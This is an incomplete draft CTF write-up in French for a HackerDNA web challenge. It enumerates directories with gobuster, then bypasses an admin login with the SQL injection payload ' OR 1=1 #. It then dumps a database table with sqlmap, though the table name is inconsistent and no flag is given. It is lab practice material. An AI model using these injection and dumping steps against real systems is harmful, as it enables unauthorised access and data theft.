---
# Imported from Obsidian: Hackerdna/Query Quake.md
# Draft: incomplete: dumps a table but never states the flag
title: Query Quake
category: Web
ctf: HackerDNA
date: 2026-05-15
summary: gobuster dir -u http://54.78.239.15 -w /usr/share/wordlists/dirb/common.txt
tags:
- hackerdna
- web
lang: fr
draft: true
imported: true
---

gobuster dir -u http://54.78.239.15 -w /usr/share/wordlists/dirb/common.txt 
 
![Screenshot](./images/obsidian/query-quake/pasted-image-20260515222509.png)

POn a un /webadmin qui redirige vers une page de login . 

Test d'injcetion sql dans le login 

apres une injection sql  dans le chmap username avec le payload suit : 
```
' OR 1=1 # 
password : n'importe
```

![Screenshot](./images/obsidian/query-quake/pasted-image-20260515222832.png)

On se connecte en tant qu'Admin avec un messgae welcome. 

![Screenshot](./images/obsidian/query-quake/pasted-image-20260515222906.png)

Utiliser sqlmap pour exploiter cette vulnéabilité

Capturer la requête de login puis stocker dans un login.txt

lancer l'attaque 

```
 sqlmap -r login.txt -p username --batch
```

On a une table intéressante : NovaTech

Extraire les infos de cette tab

```
sqlmap -r login.txt -p username --batch -T NexaTech --dump
0```
